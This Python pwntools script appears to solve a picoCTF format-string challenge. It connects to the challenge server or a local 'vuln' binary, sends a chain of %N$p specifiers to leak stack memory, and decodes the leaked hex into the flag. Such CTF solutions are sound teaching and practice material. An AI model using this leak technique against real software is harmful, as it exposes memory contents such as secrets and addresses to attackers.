#!/usr/bin/env python3
from pwn import *
from struct import pack
import re

context.binary = binary = ELF("./vuln")
# libc = ELF("./libc.so.6")

addr = 'saturn.picoctf.net'
port = '56768'

def conn():
    if args.LOCAL:
        r = process([binary.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(addr, port)
    return r

def exec_fmt(payload):
    p = process([binary.path])
    p.sendline(payload)
    return p.recvall()

def attack(r, **kwargs):
    payload = "%36$p%37$p%38$p%39$p%40$p%41$p%42$p%43$p%44$p%45$p%46$p%48$p%49$p"
    r.recvuntil(">> ")
    r.sendline(payload)
    
    r.recvline("Here's a stroy - ")
    res = r.recv()
    res = res.decode('utf-8')
    res = re.sub(r'\(nil\)|0x|\n', '', res)
    res = ''.join([chr(int(res[i:i+2], 16)) for i in range(0, len(res), 2)])
    for i in range(0, len(res), 4):
        print(res[i:i+4][::-1], end='')
    print("")

def main():
    r = conn()
    attack(r)
    r.interactive()


if __name__ == "__main__":
    main()
